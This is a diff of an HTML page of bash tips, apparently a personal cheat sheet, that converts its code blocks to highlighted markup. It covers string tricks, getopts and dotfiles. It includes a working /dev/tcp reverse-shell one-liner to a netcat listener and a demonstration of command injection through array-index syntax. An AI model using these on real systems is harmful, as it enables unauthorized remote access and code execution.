+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">echo</span><span class="w"> </span><span class="k">$((</span><span class="w"> </span><span class="k">$(</span>gdate<span class="w"> </span>+%s<span class="w"> </span>-d<span class="w"> </span><span class="m">20120203</span><span class="k">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">$(</span>gdate<span class="w"> </span>+%s<span class="w"> </span>-d<span class="w"> </span><span class="m">20120115</span><span class="k">)</span><span class="w"> </span><span class="k">))</span>
+</span></code></pre></div>
+<h3 id="substring-replace-a-variable">substring replace a variable<a class="headerlink" href="#substring-replace-a-variable" title="Permanent link">&para;</a></h3>
 <p>This is not regex, just a simple string replacement.</p>
-<pre><code class="language-bash">## ${VAR/search/replace} does only the first
-## ${VAR//search/replace} does all replacements
-echo &quot;Paths in your path: ${PATH//:/ }&quot;
-</code></pre>
-<h3 id="subtract-two-from-a-mac-address">Subtract two from a MAC address</h3>
-<pre><code class="language-bash">## printf -v defines a variable instead of printing to stdout
-printf -v dec &quot;%d&quot; 0x$(echo 00:25:9c:52:1c:2a | sed 's/://g') ;
-let dec=${dec}-2 ;
-printf &quot;%012X&quot; ${dec} \
-| sed -E 's/(..)(..)(..)(..)(..)(..)/\1:\2:\3:\4:\5:\6/g'
-</code></pre>
-<h3 id="print-the-last-for-chars-of-a-variable">Print the last for chars of a variable</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1">## ${VAR/search/replace} does only the first</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="c1">## ${VAR//search/replace} does all replacements</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Paths in your path: </span><span class="si">${</span><span class="nv">PATH</span><span class="p">//:/ </span><span class="si">}</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<h3 id="subtract-two-from-a-mac-address">Subtract two from a MAC address<a class="headerlink" href="#subtract-two-from-a-mac-address" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1">## printf -v defines a variable instead of printing to stdout</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="nb">printf</span><span class="w"> </span>-v<span class="w"> </span>dec<span class="w"> </span><span class="s2">&quot;%d&quot;</span><span class="w"> </span>0x<span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="m">00</span>:25:9c:52:1c:2a<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/://g&#39;</span><span class="k">)</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="nb">let</span><span class="w"> </span><span class="nv">dec</span><span class="o">=</span><span class="si">${</span><span class="nv">dec</span><span class="si">}</span>-2<span class="w"> </span><span class="p">;</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%012X&quot;</span><span class="w"> </span><span class="si">${</span><span class="nv">dec</span><span class="si">}</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/(..)(..)(..)(..)(..)(..)/\1:\2:\3:\4:\5:\6/g&#39;</span>
+</span></code></pre></div>
+<h3 id="print-the-last-for-chars-of-a-variable">Print the last for chars of a variable<a class="headerlink" href="#print-the-last-for-chars-of-a-variable" title="Permanent link">&para;</a></h3>
 <ul>
 <li><code>echo ${foo:$((${#foo}-4))}</code></li>
 <li><code>echo ${foo: -4}</code> The space is necessary to prevent it from</li>
 <li>doing a completely different thing. See the next example...</li>
 </ul>
-<h3 id="dereference-a-variable">Dereference a variable</h3>
-<pre><code>$ for var in ${!BASH_V*} ; do echo &quot;${var}: ${!var}&quot; ; done ;
-BASH_VERSINFO: 5
-BASH_VERSION: 5.0.7(1)-release
-</code></pre>
-<h3 id="print-something-else-if-a-variable-doesnt-exist">Print something else if a variable doesn't exist</h3>
+<h3 id="dereference-a-variable">Dereference a variable<a class="headerlink" href="#dereference-a-variable" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>$ for var in ${!BASH_V*} ; do echo &quot;${var}: ${!var}&quot; ; done ;
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>BASH_VERSINFO: 5
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>BASH_VERSION: 5.0.7(1)-release
+</span></code></pre></div>
+<h3 id="print-something-else-if-a-variable-doesnt-exist">Print something else if a variable doesn't exist<a class="headerlink" href="#print-something-else-if-a-variable-doesnt-exist" title="Permanent link">&para;</a></h3>
 <ul>
 <li><code>echo ${foo:-foo isn't assigned}</code></li>
 <li><code>echo ${foo:-${bar}}</code></li>
@@ -11567,130 +11589,130 @@ BASH_VERSION: 5.0.7(1)-release
 <ul>
 <li><code>echo ${foo:-${bar:-foo and bar are not assigned}}</code></li>
 </ul>
-<h3 id="print-every-third-number-starting-with-1-and-ending-with-30">Print every third number starting with 1 and ending with 30</h3>
+<h3 id="print-every-third-number-starting-with-1-and-ending-with-30">Print every third number starting with 1 and ending with 30<a class="headerlink" href="#print-every-third-number-starting-with-1-and-ending-with-30" title="Permanent link">&para;</a></h3>
 <p><code>echo {1..30..3}</code></p>
-<h3 id="print-every-5th-letter-of-the-alphabet">Print every 5th letter of the alphabet</h3>
+<h3 id="print-every-5th-letter-of-the-alphabet">Print every 5<sup>th</sup> letter of the alphabet<a class="headerlink" href="#print-every-5th-letter-of-the-alphabet" title="Permanent link">&para;</a></h3>
 <p><code>echo {a..z..5}</code></p>
-<h3 id="process-all-lines-but-print-out-status-about-what-line-we-are-on-every-nth-line">Process all lines, but print out status about what line we are on every Nth line</h3>
+<h3 id="process-all-lines-but-print-out-status-about-what-line-we-are-on-every-nth-line">Process all lines, but print out status about what line we are on every Nth line<a class="headerlink" href="#process-all-lines-but-print-out-status-about-what-line-we-are-on-every-nth-line" title="Permanent link">&para;</a></h3>
 <p>Sometimes during a series of long-running jobs you want to see the status of where you are at, or at least some indicator that things have not paused. when <code>ctrl-t</code> is not available (and even when it is) this pattern can help you monitor that things are still moving a long.</p>
-<pre><code class="language-bash">N=0
-find &quot;/usr/bin&quot; -type f |
-while read -r X ; do
-  N=$((N + 1))
-  [[ &quot;$((N % 50))&quot; -eq 0 ]] &amp;&amp; date &quot;+%F %T file number $N $X&quot; &gt;&amp;2
-  shasum -a 512 &quot;${X}&quot; &gt;&gt; ~/usr_bin_shasums.txt
-done
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>find<span class="w"> </span><span class="s2">&quot;/usr/bin&quot;</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="p">|</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>X<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">  </span><span class="nv">N</span><span class="o">=</span><span class="k">$((</span><span class="nv">N</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="w">  </span><span class="o">[[</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$((</span><span class="nv">N</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="m">50</span><span class="k">))</span><span class="s2">&quot;</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>date<span class="w"> </span><span class="s2">&quot;+%F %T file number </span><span class="nv">$N</span><span class="s2"> </span><span class="nv">$X</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="w">  </span>shasum<span class="w"> </span>-a<span class="w"> </span><span class="m">512</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">X</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/usr_bin_shasums.txt
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="k">done</span>
+</span></code></pre></div>
 <p>Example terminal output from the above command, while all <code>shasum</code> output goes into <code>~/usr_bin_shasums.txt</code>:</p>
-<pre><code>$ find &quot;/usr/bin&quot; -type f |
-&gt; while read -r X ; do
-&gt;   N=$((N + 1))
-&gt;   [[ &quot;$((N % 50))&quot; -eq 0 ]] &amp;&amp; date &quot;+%F %T file number $N $X&quot; &gt;&amp;2
-&gt;   shasum -a 512 &quot;${X}&quot; &gt;&gt; ~/usr_bin_shasums.txt
-&gt; done
-2018-02-24 15:30:29 file number 50 /usr/bin/toe
-2018-02-24 15:30:30 file number 100 /usr/bin/db_hotbackup
-2018-02-24 15:30:32 file number 150 /usr/bin/host
-2018-02-24 15:30:33 file number 200 /usr/bin/groffer
-2018-02-24 15:30:35 file number 250 /usr/bin/mail
-2018-02-24 15:30:36 file number 300 /usr/bin/dbicadmin
-2018-02-24 15:30:38 file number 350 /usr/bin/fwkpfv
-2018-02-24 15:30:39 file number 400 /usr/bin/tab2space
-</code></pre>
-<h3 id="make-a-directory-structure-of-every-combination-of-adjectivenoun">Make a directory structure of every combination of /adjective/noun</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>$ find &quot;/usr/bin&quot; -type f |
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>&gt; while read -r X ; do
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>&gt;   N=$((N + 1))
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>&gt;   [[ &quot;$((N % 50))&quot; -eq 0 ]] &amp;&amp; date &quot;+%F %T file number $N $X&quot; &gt;&amp;2
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>&gt;   shasum -a 512 &quot;${X}&quot; &gt;&gt; ~/usr_bin_shasums.txt
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>&gt; done
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>2018-02-24 15:30:29 file number 50 /usr/bin/toe
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>2018-02-24 15:30:30 file number 100 /usr/bin/db_hotbackup
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>2018-02-24 15:30:32 file number 150 /usr/bin/host
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>2018-02-24 15:30:33 file number 200 /usr/bin/groffer
+</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>2018-02-24 15:30:35 file number 250 /usr/bin/mail
+</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a>2018-02-24 15:30:36 file number 300 /usr/bin/dbicadmin
+</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a>2018-02-24 15:30:38 file number 350 /usr/bin/fwkpfv
+</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>2018-02-24 15:30:39 file number 400 /usr/bin/tab2space
+</span></code></pre></div>
+<h3 id="make-a-directory-structure-of-every-combination-of-adjectivenoun">Make a directory structure of every combination of /adjective/noun<a class="headerlink" href="#make-a-directory-structure-of-every-combination-of-adjectivenoun" title="Permanent link">&para;</a></h3>
 <p><code>mkdir -p {red,green,blue}/{fish,bird,flower}</code></p>
-<h3 id="generate-a-zero-padded-random-2-byte-hex-number">Generate a zero padded random 2 byte hex number</h3>
+<h3 id="generate-a-zero-padded-random-2-byte-hex-number">Generate a zero padded random 2 byte hex number<a class="headerlink" href="#generate-a-zero-padded-random-2-byte-hex-number" title="Permanent link">&para;</a></h3>
 <p><code>printf "%02X\n" $((RANDOM % 256))</code></p>
-<h3 id="grep-many-log-files-and-sort-output-by-date">grep many log files and sort output by date</h3>
-<pre><code class="language-bash">sudo grep cron /var/log/* |
-sed 's/:/ /' |
-while read file month day hour line ; do
-  date -d &quot;$month $day $hour&quot; &quot;+%F %T%z ${file} ${line}&quot; ;
-done |
-sort
-</code></pre>
-<h3 id="get-command-line-switches">Get command line switches</h3>
+<h3 id="grep-many-log-files-and-sort-output-by-date">grep many log files and sort output by date<a class="headerlink" href="#grep-many-log-files-and-sort-output-by-date" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>sudo<span class="w"> </span>grep<span class="w"> </span>cron<span class="w"> </span>/var/log/*<span class="w"> </span><span class="p">|</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>sed<span class="w"> </span><span class="s1">&#39;s/:/ /&#39;</span><span class="w"> </span><span class="p">|</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>file<span class="w"> </span>month<span class="w"> </span>day<span class="w"> </span>hour<span class="w"> </span>line<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">  </span>date<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$month</span><span class="s2"> </span><span class="nv">$day</span><span class="s2"> </span><span class="nv">$hour</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;+%F %T%z </span><span class="si">${</span><span class="nv">file</span><span class="si">}</span><span class="s2"> </span><span class="si">${</span><span class="nv">line</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="k">done</span><span class="w"> </span><span class="p">|</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>sort
+</span></code></pre></div>
+<h3 id="get-command-line-switches">Get command line switches<a class="headerlink" href="#get-command-line-switches" title="Permanent link">&para;</a></h3>
 <p>From <a href="https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#index-getopts">the docs</a></p>
 <ul>
 <li>If a character is followed by a colon, the option is expected to have an argument.</li>
 <li>If the first character of optstring is a colon, silent error reporting is used.</li>
 </ul>
-<pre><code class="language-bash">while getopts p:l:t: opt; do
-  case $opt in
-    p) pages=$OPTARG ;;
-    l) length=$OPTARG ;;
-    t) time=$OPTARG ;;
-  esac
-done
-
-shift $((OPTIND - 1))
-echo &quot;pages is ${pages}&quot;
-echo &quot;length is ${length}&quot;
-echo &quot;time is ${time}&quot;
-echo &quot;\$1 is $1&quot;
-echo &quot;\$2 is $2&quot;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="k">while</span><span class="w"> </span><span class="nb">getopts</span><span class="w"> </span>p:l:t:<span class="w"> </span>opt<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="nv">$opt</span><span class="w"> </span><span class="k">in</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="w">    </span>p<span class="o">)</span><span class="w"> </span><span class="nv">pages</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="w"> </span><span class="p">;;</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="w">    </span>l<span class="o">)</span><span class="w"> </span><span class="nv">length</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="w"> </span><span class="p">;;</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="w">    </span>t<span class="o">)</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="w"> </span><span class="p">;;</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">  </span><span class="k">esac</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="k">done</span>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="nb">shift</span><span class="w"> </span><span class="k">$((</span><span class="nv">OPTIND</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;pages is </span><span class="si">${</span><span class="nv">pages</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;length is </span><span class="si">${</span><span class="nv">length</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;time is </span><span class="si">${</span><span class="nv">time</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;\$1 is </span><span class="nv">$1</span><span class="s2">&quot;</span>
+</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;\$2 is </span><span class="nv">$2</span><span class="s2">&quot;</span>
+</span></code></pre></div>
 <p>Call this script as <code>./foo.sh -p "this is p" -l llll -t this\ is\ t foo bar</code></p>
-<h3 id="unexpected-code-execution">Unexpected code execution</h3>
+<h3 id="unexpected-code-execution">Unexpected code execution<a class="headerlink" href="#unexpected-code-execution" title="Permanent link">&para;</a></h3>
 <p>When using numeric comparison operators that use array syntax, code that determines the array index is executed:</p>
-<pre><code>$ rm -f pwnd ; [[ -v '$(echo hello &gt; pwnd)' ]] ; cat pwnd ; # does not use array syntax
-cat: pwnd: No such file or directory
-$ rm -f pwnd ; [[ -v 'x[$(echo hello &gt; pwnd)]' ]] ; cat pwnd ; # uses array syntax
-hello
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>$ rm -f pwnd ; [[ -v &#39;$(echo hello &gt; pwnd)&#39; ]] ; cat pwnd ; # does not use array syntax
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>cat: pwnd: No such file or directory
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>$ rm -f pwnd ; [[ -v &#39;x[$(echo hello &gt; pwnd)]&#39; ]] ; cat pwnd ; # uses array syntax
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>hello
+</span></code></pre></div>
 <p>This also happens with <code>-eq</code></p>
-<pre><code>$ rm -f pwnd ; [[ 0 -eq 'x$(echo hello &gt; pwnd)' ]] ; cat pwnd ; # does not use array syntax
--bash: [[: x$(echo hello &gt; pwnd): syntax error: invalid arithmetic operator (error token is &quot;$(echo hello &gt; pwnd)&quot;)
-cat: pwnd: No such file or directory
-$ rm -f pwnd ; [[ 0 -eq 'x[$(echo hello &gt; pwnd)]' ]] ; cat pwnd ; # uses array syntax
-hello
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>$ rm -f pwnd ; [[ 0 -eq &#39;x$(echo hello &gt; pwnd)&#39; ]] ; cat pwnd ; # does not use array syntax
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>-bash: [[: x$(echo hello &gt; pwnd): syntax error: invalid arithmetic operator (error token is &quot;$(echo hello &gt; pwnd)&quot;)
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>cat: pwnd: No such file or directory
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>$ rm -f pwnd ; [[ 0 -eq &#39;x[$(echo hello &gt; pwnd)]&#39; ]] ; cat pwnd ; # uses array syntax
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>hello
+</span></code></pre></div>
 <p>Via <a href="https://yossarian.net/til/post/some-surprising-code-execution-sources-in-bash">https://yossarian.net/til/post/some-surprising-code-execution-sources-in-bash</a></p>
-<h3 id="reverse-shell-to-netcat">Reverse shell to netcat</h3>
+<h3 id="reverse-shell-to-netcat">Reverse shell to netcat<a class="headerlink" href="#reverse-shell-to-netcat" title="Permanent link">&para;</a></h3>
 <p>In linux, you can use bash and the built in linux tcp features to create a reverse shell to a netcat listener. Assuming a host with the ip address 10.0.1.254, you would run:</p>
-<pre><code class="language-sh">netcat -l 8888
-</code></pre>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>netcat<span class="w"> </span>-l<span class="w"> </span><span class="m">8888</span>
+</span></code></pre></div>
 <p>Then on the shell where you want the remote shell to spawn, you would run:</p>
-<pre><code class="language-sh">bash -i &gt;&amp; /dev/tcp/10.0.1.254/8888 0&gt;&amp;1
-</code></pre>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.1.254/8888<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></code></pre></div>
 <p>The netcat command will proceed into an interactive a shell. This shell is not fully functional, and you will encounter some odd behaviors and missing features.</p>
-<h2 id="files">Files</h2>
+<h2 id="files">Files<a class="headerlink" href="#files" title="Permanent link">&para;</a></h2>
 <p>These files can change the behavior of bash.</p>
-<h3 id="bash_profile">.bash_profile</h3>
+<h3 id="bash_profile">.bash_profile<a class="headerlink" href="#bash_profile" title="Permanent link">&para;</a></h3>
 <p><code>~/.bash_profile</code> is executed every time you log into the system or initiate a login shell. Inclusion of things that write to stdout is allowed here.</p>
 <p>If you want to write scripts that change your interactive shell environment, such as changing your CWD, define functions here instead of using stand-alone scripts.</p>
-<h4 id="example-bash_profile">Example .bash_profile</h4>
+<h4 id="example-bash_profile">Example .bash_profile<a class="headerlink" href="#example-bash_profile" title="Permanent link">&para;</a></h4>
 <p>The <code>~/.bash_profile</code> file can be quite long and complicated. The following example is an incomplete sample:</p>
-<pre><code class="language-bash">export EDITOR=/usr/bin/vim
-export GZIP='-9'
-export HISTSIZE=5000
-export HISTTIMEFORMAT='%F %T%z '
-export PS1=&quot;\u@\h:\w$ &quot;
-export TERM=xterm-256color
-export TMOUT=&quot;1800&quot;  # log out after this many seconds of shell inactivity
-
-alias ll='ls -la'
-alias temp='date_F=$(date +%F) ; mkdir -p ~/temp/$date_F 2&gt;/dev/null ; cd ~/temp/$date_F'
-
-sprunge() { curl -F 'sprunge=&lt;-' http://sprunge.us &lt; &quot;${1:-/dev/stdin}&quot;; } # usage: sprunge FILE # or some_command | sprunge
-
-## Don't record some commands
-export HISTIGNORE=&quot;&amp;:[ ]*:exit:ls:bg:fg:history:clear&quot;
-
-## Avoid duplicate entries
-HISTCONTROL=&quot;erasedups:ignoreboth&quot;
-
-## Perform file completion in a case insensitive fashion
-bind &quot;set completion-ignore-case on&quot;
-</code></pre>
-<h3 id="bashrc">.bashrc</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">EDITOR</span><span class="o">=</span>/usr/bin/vim
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">GZIP</span><span class="o">=</span><span class="s1">&#39;-9&#39;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">HISTSIZE</span><span class="o">=</span><span class="m">5000</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">HISTTIMEFORMAT</span><span class="o">=</span><span class="s1">&#39;%F %T%z &#39;</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;\u@\h:\w</span>$<span class="s2"> &quot;</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TMOUT</span><span class="o">=</span><span class="s2">&quot;1800&quot;</span><span class="w">  </span><span class="c1"># log out after this many seconds of shell inactivity</span>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">ll</span><span class="o">=</span><span class="s1">&#39;ls -la&#39;</span>
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">temp</span><span class="o">=</span><span class="s1">&#39;date_F=$(date +%F) ; mkdir -p ~/temp/$date_F 2&gt;/dev/null ; cd ~/temp/$date_F&#39;</span>
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>
